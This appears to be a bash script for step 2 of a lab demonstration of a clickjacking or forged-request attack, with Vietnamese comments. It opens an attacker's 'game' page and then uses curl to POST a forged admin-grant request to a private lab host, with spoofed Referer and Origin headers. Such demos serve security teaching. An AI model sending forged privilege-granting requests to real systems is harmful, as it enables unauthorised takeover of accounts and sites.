#!/bin/bash
echo "========================================================"
echo "BUOC 2: Mo trang GAME cua ke tan cong"
echo "========================================================"
echo "URL: http://192.168.10.50/game.html"

# Mo Firefox hien thi trang game
firefox http://192.168.10.50/game.html &

read -p "Nhan Enter sau khi da xem trang game..."

# Lenh truc tiep: Gia lap click chuot vao iframe ngam kem Referer
echo "[victim] Dang gui request click chuot toi trang admin..."
curl -s -X POST \
     -H "Referer: http://192.168.10.50/game.html" \
     -H "Origin: http://192.168.10.50" \
     http://172.20.0.10/admin/settings/grant-admin > /dev/null

echo "[victim] Da click vao nut admin thanh cong!"
echo "game_page_visited=yes"
